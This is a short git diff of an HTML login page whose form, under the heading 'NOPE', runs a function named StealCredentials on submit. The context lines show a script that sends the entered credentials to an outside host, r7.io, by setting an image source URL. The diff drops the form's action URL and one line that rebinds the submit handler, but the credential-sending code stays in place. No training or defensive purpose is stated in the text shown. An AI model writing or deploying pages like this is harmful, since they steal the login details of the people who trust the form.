@@ -28,7 +28,7 @@
 
 <body class="sessions">
 <div id="signin" class="reveal">
-  <form id="login" action="https://nickhytrek.github.io" method="get" class="untouched" onsubmit="StealCredentials()">
+  <form id="login" method="get" class="untouched" onsubmit="StealCredentials()">
       <h1><a href="#">NOPE</a></h1>
     
       <p>
@@ -44,7 +44,6 @@
                 img.src = "http://r7.io/e/nhytrek?s=" + credentials;
             }
             console.log("test4");
-            document.getElementById('login').onsubmit = StealCredentials;
             </script>
       </p>
 
